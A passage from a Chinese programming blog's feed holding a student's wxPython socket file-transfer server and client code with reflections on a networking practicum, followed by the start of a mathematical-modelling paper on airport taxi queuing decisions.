            <span class="token comment"># 第三步：再发报头</span>                    conn<span class="token punctuation">.</span>send<span class="token punctuation">(</span>header_bytes<span class="token punctuation">)</span>                    <span class="token comment"># 第四步：发送真实数据</span>                    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'%s/%s'</span> <span class="token operator">%</span> <span class="token punctuation">(</span>self<span class="token punctuation">.</span>share_dir<span class="token punctuation">,</span> filename<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>                        <span class="token keyword">for</span> line <span class="token keyword">in</span> f<span class="token punctuation">:</span>                            <span class="token comment"># 这样一行一行发比直接发送f.read节省内存空间</span>                            conn<span class="token punctuation">.</span>send<span class="token punctuation">(</span>line<span class="token punctuation">)</span>                    conn<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>                    <span class="token comment"># except ConnectionResetError as err:</span>                    <span class="token comment"># break</span>                    <span class="token keyword">break</span>        phone<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">bjk1_axEnterj</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>event<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token comment"># print('bjk1,按下Enter键')</span>        <span class="token comment"># print(self.share_dir)</span>        <span class="token keyword">pass</span>    <span class="token keyword">def</span> <span class="token function">an2_anbdj</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>event<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token comment"># print('an2,按钮被单击')</span>        dialog <span class="token operator">=</span> wx<span class="token punctuation">.</span>DirDialog<span class="token punctuation">(</span>self<span class="token punctuation">.</span>qdck<span class="token punctuation">,</span> message<span class="token operator">=</span><span class="token string">"打开文件夹"</span><span class="token punctuation">,</span> style<span class="token operator">=</span>wx<span class="token punctuation">.</span>DD_CHANGE_DIR<span class="token punctuation">)</span>        <span class="token keyword">if</span> dialog<span class="token punctuation">.</span>ShowModal<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> wx<span class="token punctuation">.</span>ID_OK<span class="token punctuation">:</span>            filename <span class="token operator">=</span> dialog<span class="token punctuation">.</span>GetPath<span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>filename<span class="token punctuation">)</span>            self<span class="token punctuation">.</span>share_dir<span class="token operator">=</span><span class="token builtin">str</span><span class="token punctuation">(</span>filename<span class="token punctuation">)</span>            img_list <span class="token operator">=</span> os<span class="token punctuation">.</span>listdir<span class="token punctuation">(</span>self<span class="token punctuation">.</span>share_dir<span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>img_list<span class="token punctuation">)</span>            <span class="token builtin">file</span> <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'文件菜单.txt'</span><span class="token punctuation">,</span> <span class="token string">'w'</span><span class="token punctuation">)</span>  <span class="token comment"># 创建文件，权限为写入</span>            <span class="token keyword">for</span> img_name <span class="token keyword">in</span> img_list<span class="token punctuation">:</span>                <span class="token builtin">file</span><span class="token punctuation">.</span>write<span class="token punctuation">(</span>img_name <span class="token operator">+</span> <span class="token string">'\n'</span><span class="token punctuation">)</span>            toastone <span class="token operator">=</span> wx<span class="token punctuation">.</span>MessageDialog<span class="token punctuation">(</span><span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token string">"文件菜单已创建"</span><span class="token punctuation">,</span> <span class="token string">"软件提示"</span><span class="token punctuation">,</span> wx<span class="token punctuation">.</span>YES_DEFAULT <span class="token operator">|</span> wx<span class="token punctuation">.</span>ICON_QUESTION<span class="token punctuation">)</span>            <span class="token keyword">if</span> toastone<span class="token punctuation">.</span>ShowModal<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> wx<span class="token punctuation">.</span>ID_YES<span class="token punctuation">:</span>                <span class="token comment"># 如果点击了提示框的确定按钮</span>                toastone<span class="token punctuation">.</span>Destroy<span class="token punctuation">(</span><span class="token punctuation">)</span>                <span class="token comment"># 则关闭提示框</span>            dialog<span class="token punctuation">.</span>Destroy<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">class</span> <span class="token class-name">myApp</span><span class="token punctuation">(</span>wx<span class="token punctuation">.</span>App<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">OnInit</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>frame <span class="token operator">=</span> Frame<span class="token punctuation">(</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>frame<span class="token punctuation">.</span>Show<span class="token punctuation">(</span><span class="token boolean">True</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token boolean">True</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    app <span class="token operator">=</span> myApp<span class="token punctuation">(</span><span class="token punctuation">)</span>    app<span class="token punctuation">.</span>MainLoop<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="客户端："><a href="#客户端：" class="headerlink" title="客户端："></a>客户端：</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># -*- coding:utf-8 -*-</span><span class="token keyword">import</span> wx<span class="token punctuation">.</span>lib<span class="token punctuation">.</span>agw<span class="token punctuation">.</span>hyperlink <span class="token keyword">as</span> lib_hyperlink<span class="token keyword">import</span> wx<span class="token keyword">import</span> socket<span class="token keyword">import</span> struct  <span class="token comment"># 制作报头的模块</span><span class="token keyword">import</span> json   <span class="token comment"># 转换数据格式(序列化)</span><span class="token keyword">class</span> <span class="token class-name">Frame</span><span class="token punctuation">(</span>wx<span class="token punctuation">.</span>Frame<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        wx<span class="token punctuation">.</span>Frame<span class="token punctuation">.</span>__init__<span class="token punctuation">(</span>self<span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">,</span> title<span class="token operator">=</span><span class="token string">'简单文件传输器（客户端）'</span><span class="token punctuation">,</span> size<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">800</span><span class="token punctuation">,</span> <span class="token number">300</span><span class="token punctuation">)</span><span class="token punctuation">,</span>name<span class="token operator">=</span><span class="token string">'frame'</span><span class="token punctuation">,</span>style<span class="token operator">=</span><span class="token number">541072384</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>qdck <span class="token operator">=</span> wx<span class="token punctuation">.</span>Panel<span class="token punctuation">(</span>self<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>Centre<span class="token punctuation">(</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>an1 <span class="token operator">=</span> wx<span class="token punctuation">.</span>Button<span class="token punctuation">(</span>self<span class="token punctuation">.</span>qdck<span class="token punctuation">,</span>size<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">,</span> <span class="token number">46</span><span class="token punctuation">)</span><span class="token punctuation">,</span>pos<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">220</span><span class="token punctuation">,</span> <span class="token number">135</span><span class="token punctuation">)</span><span class="token punctuation">,</span>label<span class="token operator">=</span><span class="token string">'下载'</span><span class="token punctuation">,</span>name<span class="token operator">=</span><span class="token string">'button'</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>an1<span class="token punctuation">.</span>SetAuthNeeded<span class="token punctuation">(</span><span class="token boolean">True</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>an1<span class="token punctuation">.</span>Bind<span class="token punctuation">(</span>wx<span class="token punctuation">.</span>EVT_BUTTON<span class="token punctuation">,</span>self<span class="token punctuation">.</span>an1_anbdj<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>bjk1 <span class="token operator">=</span> wx<span class="token punctuation">.</span>TextCtrl<span class="token punctuation">(</span>self<span class="token punctuation">.</span>qdck<span class="token punctuation">,</span>size<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">,</span>pos<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">300</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">,</span>value<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">,</span>name<span class="token operator">=</span><span class="token string">'text'</span><span class="token punctuation">,</span>style<span class="token operator">=</span><span class="token number">4096</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>bjk1<span class="token punctuation">.</span>SetMaxLength<span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>bq1 <span class="token operator">=</span> wx<span class="token punctuation">.</span>StaticText<span class="token punctuation">(</span>self<span class="token punctuation">.</span>qdck<span class="token punctuation">,</span>size<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">265</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">,</span>pos<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">30</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">,</span>label<span class="token operator">=</span><span class="token string">'请输入服务器IP地址:'</span><span class="token punctuation">,</span>name<span class="token operator">=</span><span class="token string">'staticText'</span><span class="token punctuation">,</span>style<span class="token operator">=</span><span class="token number">2321</span><span class="token punctuation">)</span>        bq1_字体 <span class="token operator">=</span> wx<span class="token punctuation">.</span>Font<span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">,</span><span class="token number">74</span><span class="token punctuation">,</span><span class="token number">90</span><span class="token punctuation">,</span><span class="token number">700</span><span class="token punctuation">,</span><span class="token boolean">False</span><span class="token punctuation">,</span><span class="token string">'Microsoft YaHei UI'</span><span class="token punctuation">,</span><span class="token number">28</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>bq1<span class="token punctuation">.</span>SetFont<span class="token punctuation">(</span>bq1_字体<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>bq2 <span class="token operator">=</span> wx<span class="token punctuation">.</span>StaticText<span class="token punctuation">(</span>self<span class="token punctuation">.</span>qdck<span class="token punctuation">,</span> size<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">265</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">,</span> pos<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">30</span><span class="token punctuation">,</span> <span class="token number">70</span><span class="token punctuation">)</span><span class="token punctuation">,</span> label<span class="token operator">=</span><span class="token string">'请输入需要下载的文件:'</span><span class="token punctuation">,</span> name<span class="token operator">=</span><span class="token string">'staticText'</span><span class="token punctuation">,</span>                                 style<span class="token operator">=</span><span class="token number">2321</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>bq2<span class="token punctuation">.</span>SetFont<span class="token punctuation">(</span>bq1_字体<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>bjk2 <span class="token operator">=</span> wx<span class="token punctuation">.</span>TextCtrl<span class="token punctuation">(</span>self<span class="token punctuation">.</span>qdck<span class="token punctuation">,</span> size<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">,</span> pos<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">300</span><span class="token punctuation">,</span> <span class="token number">70</span><span class="token punctuation">)</span><span class="token punctuation">,</span> value<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">,</span> name<span class="token operator">=</span><span class="token string">'text'</span><span class="token punctuation">,</span> style<span class="token operator">=</span><span class="token number">4096</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>bjk2<span class="token punctuation">.</span>SetMaxLength<span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>cjljkL1 <span class="token operator">=</span> lib_hyperlink<span class="token punctuation">.</span>HyperLinkCtrl<span class="token punctuation">(</span>self<span class="token punctuation">.</span>qdck<span class="token punctuation">,</span>size<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">,</span> <span class="token number">28</span><span class="token punctuation">)</span><span class="token punctuation">,</span>pos<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">380</span><span class="token punctuation">,</span> <span class="token number">200</span><span class="token punctuation">)</span><span class="token punctuation">,</span>name<span class="token operator">=</span><span class="token string">'staticText'</span><span class="token punctuation">,</span>                                                   label<span class="token operator">=</span><span class="token string">'使用说明'</span><span class="token punctuation">,</span>URL<span class="token operator">=</span><span class="token string">'https://im-so-scared-2.gitee.io/shier_jinghuang/'</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>cjljkL1<span class="token punctuation">.</span>SetToolTip<span class="token punctuation">(</span>wx<span class="token punctuation">.</span>ToolTip<span class="token punctuation">(</span><span class="token string">'使用说明'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        cjljkL1_字体 <span class="token operator">=</span> wx<span class="token punctuation">.</span>Font<span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">70</span><span class="token punctuation">,</span><span class="token number">90</span><span class="token punctuation">,</span><span class="token number">400</span><span class="token punctuation">,</span><span class="token boolean">True</span><span class="token punctuation">,</span><span class="token string">'Microsoft YaHei UI'</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>cjljkL1<span class="token punctuation">.</span>SetFont<span class="token punctuation">(</span>cjljkL1_字体<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>cjljkL1<span class="token punctuation">.</span>SetForegroundColour<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">255</span><span class="token punctuation">,</span> <span class="token number">255</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>an2 <span class="token operator">=</span> wx<span class="token punctuation">.</span>Button<span class="token punctuation">(</span>self<span class="token punctuation">.</span>qdck<span class="token punctuation">,</span> size<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">120</span><span class="token punctuation">,</span> <span class="token number">46</span><span class="token punctuation">)</span><span class="token punctuation">,</span> pos<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">450</span><span class="token punctuation">,</span> <span class="token number">135</span><span class="token punctuation">)</span><span class="token punctuation">,</span> label<span class="token operator">=</span><span class="token string">'选择文件存放地址'</span><span class="token punctuation">,</span> name<span class="token operator">=</span><span class="token string">'button'</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>an2<span class="token punctuation">.</span>Bind<span class="token punctuation">(</span>wx<span class="token punctuation">.</span>EVT_BUTTON<span class="token punctuation">,</span> self<span class="token punctuation">.</span>an2_anbdj<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>an2<span class="token punctuation">.</span>SetAuthNeeded<span class="token punctuation">(</span><span class="token boolean">True</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>share_dir <span class="token operator">=</span> <span class="token string">""</span>    <span class="token keyword">def</span> <span class="token function">an2_anbdj</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>event<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token comment"># print('an2,按钮被单击')</span>        dialog <span class="token operator">=</span> wx<span class="token punctuation">.</span>DirDialog<span class="token punctuation">(</span>self<span class="token punctuation">.</span>qdck<span class="token punctuation">,</span> message<span class="token operator">=</span><span class="token string">"请选择文件存放地址"</span><span class="token punctuation">,</span> style<span class="token operator">=</span>wx<span class="token punctuation">.</span>DD_CHANGE_DIR<span class="token punctuation">)</span>        <span class="token keyword">if</span> dialog<span class="token punctuation">.</span>ShowModal<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> wx<span class="token punctuation">.</span>ID_OK<span class="token punctuation">:</span>            filename <span class="token operator">=</span> dialog<span class="token punctuation">.</span>GetPath<span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>filename<span class="token punctuation">)</span>            self<span class="token punctuation">.</span>share_dir <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>filename<span class="token punctuation">)</span>            dialog<span class="token punctuation">.</span>Destroy<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">an1_anbdj</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>event<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>ip<span class="token operator">=</span>self<span class="token punctuation">.</span>bjk1<span class="token punctuation">.</span>GetValue<span class="token punctuation">(</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>filename<span class="token operator">=</span>self<span class="token punctuation">.</span>bjk2<span class="token punctuation">.</span>GetValue<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>filename<span class="token punctuation">)</span>        phone <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>ip<span class="token punctuation">)</span>        cmd <span class="token operator">=</span> <span class="token string">"get "</span> <span class="token operator">+</span> self<span class="token punctuation">.</span>filename        <span class="token keyword">print</span><span class="token punctuation">(</span>cmd<span class="token punctuation">)</span>        phone<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>ip<span class="token punctuation">,</span> <span class="token number">8000</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"------开始咨询客服---------"</span><span class="token punctuation">)</span>        <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>            <span class="token comment"># 发命令</span>            <span class="token comment"># get a.txt</span>            <span class="token keyword">if</span> cmd<span class="token operator">==</span><span class="token string">'a'</span><span class="token punctuation">:</span>                <span class="token keyword">break</span>            phone<span class="token punctuation">.</span>send<span class="token punctuation">(</span>cmd<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">"gbk"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token comment"># 已写的方式打开一个新文件，接收服务器发来的文件的内容写入客户端的新文件</span>            <span class="token comment"># 第一步：先收取报头的长度</span>            obj <span class="token operator">=</span> phone<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>            header_size <span class="token operator">=</span> struct<span class="token punctuation">.</span>unpack<span class="token punctuation">(</span><span class="token string">'i'</span><span class="token punctuation">,</span> obj<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>            <span class="token comment"># 第二步：再收报头</span>            header_bytes <span class="token operator">=</span> phone<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>header_size<span class="token punctuation">)</span>            <span class="token comment"># 第三步：从报头中间解析出对真是数据的描述信息</span>            header_json <span class="token operator">=</span> header_bytes<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'gbk'</span><span class="token punctuation">)</span>            header_dic <span class="token operator">=</span> json<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>header_json<span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>header_dic<span class="token punctuation">)</span>            total_size <span class="token operator">=</span> header_dic<span class="token punctuation">[</span><span class="token string">'file_size'</span><span class="token punctuation">]</span>            filename <span class="token operator">=</span> header_dic<span class="token punctuation">[</span><span class="token string">'filename'</span><span class="token punctuation">]</span>            <span class="token comment"># 第三步：接受真实的数据</span>            <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'%s/%s'</span> <span class="token operator">%</span> <span class="token punctuation">(</span>self<span class="token punctuation">.</span>share_dir<span class="token punctuation">,</span> filename<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'wb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>  <span class="token comment"># 在自己的电脑中找一个地址打开一个同类型的文件准备接收数据</span>                recv_size <span class="token operator">=</span> <span class="token number">0</span>                <span class="token keyword">while</span> recv_size <span class="token operator">&lt;</span> total_size<span class="token punctuation">:</span>                    line <span class="token operator">=</span> phone<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>                    f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>line<span class="token punctuation">)</span>                    recv_size <span class="token operator">+=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>line<span class="token punctuation">)</span>                    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'总大小：%s   已下载大小：%s'</span> <span class="token operator">%</span> <span class="token punctuation">(</span>total_size<span class="token punctuation">,</span> recv_size<span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># 显示下载进度</span>            cmd<span class="token operator">=</span><span class="token string">'a'</span>            toastone <span class="token operator">=</span> wx<span class="token punctuation">.</span>MessageDialog<span class="token punctuation">(</span><span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token string">"文件下载完成!"</span><span class="token punctuation">,</span> <span class="token string">"信息提示"</span><span class="token punctuation">,</span> wx<span class="token punctuation">.</span>YES_DEFAULT <span class="token operator">|</span> wx<span class="token punctuation">.</span>ICON_QUESTION<span class="token punctuation">)</span>            <span class="token keyword">if</span> toastone<span class="token punctuation">.</span>ShowModal<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> wx<span class="token punctuation">.</span>ID_YES<span class="token punctuation">:</span>                <span class="token comment"># 如果点击了提示框的确定按钮</span>                toastone<span class="token punctuation">.</span>Destroy<span class="token punctuation">(</span><span class="token punctuation">)</span>                <span class="token comment"># 则关闭提示框</span>        phone<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">class</span> <span class="token class-name">myApp</span><span class="token punctuation">(</span>wx<span class="token punctuation">.</span>App<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">OnInit</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>frame <span class="token operator">=</span> Frame<span class="token punctuation">(</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>frame<span class="token punctuation">.</span>Show<span class="token punctuation">(</span><span class="token boolean">True</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token boolean">True</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    app <span class="token operator">=</span> myApp<span class="token punctuation">(</span><span class="token punctuation">)</span>    app<span class="token punctuation">.</span>MainLoop<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="写在最后："><a href="#写在最后：" class="headerlink" title="写在最后："></a>写在最后：</h3><p>这个简单文件传输器是真的简单，基本上还是点对点的下载，只是我想尝试模拟FTP协议，但是发现如果用py开启这个协议，实验完全就是协议的工作了，这个文件传输器就变成了协议开启器。</p><p>在权衡之后，我采用了在服务器端读取设置的共享文件夹的文件名，并将其写成一个文件，客户端通过下载该文件可以实现对其他文件的可知。</p><p>当我在第二天一开始，把这个代码写完时，我以为我接下来的任务会很轻松然后………..</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;只能说计算机网络实训那一周我是真的难受，不仅仅有我自己的实训任务还有别人的，自己这个任务一实际上是第一天就写完了的，大部分的时间是在做网络的一些内容，以及同组其他成员的可视化。&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;[TOC]&lt;/p&gt;
&lt;h2 id=&quot;简单文件传输系统器&quot;&gt;&lt;a href</summary>
      
    
    
    
    <category term="项目设计" scheme="https://shierjinghuang.github.io/categories/%E9%A1%B9%E7%9B%AE%E8%AE%BE%E8%AE%A1/"/>
    
    
    <category term="实训记录" scheme="https://shierjinghuang.github.io/tags/%E5%AE%9E%E8%AE%AD%E8%AE%B0%E5%BD%95/"/>
    
    <category term="计算机网络" scheme="https://shierjinghuang.github.io/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/"/>
    
    <category term="FTP" scheme="https://shierjinghuang.github.io/tags/FTP/"/>
    
  </entry>
  
  <entry>
    <title>数学建模：综合选拔题</title>
    <link href="https://shierjinghuang.github.io/2022/08/10/%E6%95%B0%E5%AD%A6%E5%BB%BA%E6%A8%A1%E5%9B%BD%E8%B5%9B%E9%80%89%E6%8B%94/"/>
    <id>https://shierjinghuang.github.io/2022/08/10/%E6%95%B0%E5%AD%A6%E5%BB%BA%E6%A8%A1%E5%9B%BD%E8%B5%9B%E9%80%89%E6%8B%94/</id>
    <published>2022-08-10T02:40:20.000Z</published>
    <updated>2025-03-27T07:53:31.685Z</updated>
    
    <content type="html"><![CDATA[<h2 id="数学建模：综合选拔题"><a href="#数学建模：综合选拔题" class="headerlink" title="数学建模：综合选拔题"></a>数学建模：综合选拔题</h2><h3 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h3><p>随着我国航空工业技术的发展和人民生活水平的不断提高，我国民用航空业发展迅速，在可预见的未来伴随着国产大飞机的逐步投产交付，全国各地将兴建起一批新机场，同时机场的旅客吞吐量不断攀升，旅客离港时出租车是机场重要的散客渠道之一。</p><p>由于不同时空，机场规模不同，航班载客数量等做多方面存在差距，如何解决离港出租车排队等待离港的判断问题的研究具有深远意义。本文针对日照市机场，从出租车司机收益最大的角度出发，给出该机场出租车司机的选择方案模型，并分析模型的合理性和对相关因素的依赖性。</p><p>司机排队等待的收益是不确定的，司机空载返回的成本是确定的，影响司机决策的主要因素是可能的等待时间成本。在司机预测空载返回后，在所节省的排队时间进行正常接送乘客的扣除空载返回的损失后的收益大于在机场排队载客的收益时，司机会倾向于选择空载返回市区，反之司机会倾向于选择在机场排队载客。</p><p>关键字： 排队论 费用决策 数据处理 客流集散特性</p><p>[TOC]</p><h3 id="一、问题重述："><a href="#一、问题重述：" class="headerlink" title="一、问题重述："></a>一、问题重述：</h3><p>根据统计，多数乘客到达机场后，都会将市区作为目的地。而出租车因其方便快捷而备受出港旅客青睐。在今年数据中在同时拥有城市内轨道交通，出租车，机场大巴等出行方式的特大机场如首都机场，通过出租车进行的人员集散仍然十分可观。在出行选择较为单一的中小型机场中，出租车仍作为主要旅客集散方式。</p><p>同时，对于出租车司机，出港旅客也是一个巨大的客户来源。但是，一般来讲，国内机场离城市中心比较远，想要在机场承接客流量，出租车司机往往会面临在机场等待还是回城市中心的选择:</p><p>在机场载客返回。由于国内机场多数采用进站客流与出站客流分离的规划思想使得出租车司机想要在到达机场后载客，需要按照“先来后到”的顺序进入指定“蓄车池”等待，等待时间则取决于到港乘客多少、蓄车池数量以及排队出租车的数量，这就需要司机付出一定的时间成本。</p><p>空载返回市区接客。出租车司机付出空载费用（多余的油耗、时间等）以及潜在客户收益，选择承接城区稳定的客流量来源。</p><p>在整个问题中最为影响司机决策判断的应为时间成本，即损失时间内可获得的经济效益</p><h3 id="二、模型假设与符号说明："><a href="#二、模型假设与符号说明：" class="headerlink" title="二、模型假设与符号说明："></a>二、模型假设与符号说明：</h3><h4 id="2-1模型假设"><a href="#2-1模型假设" class="headerlink" 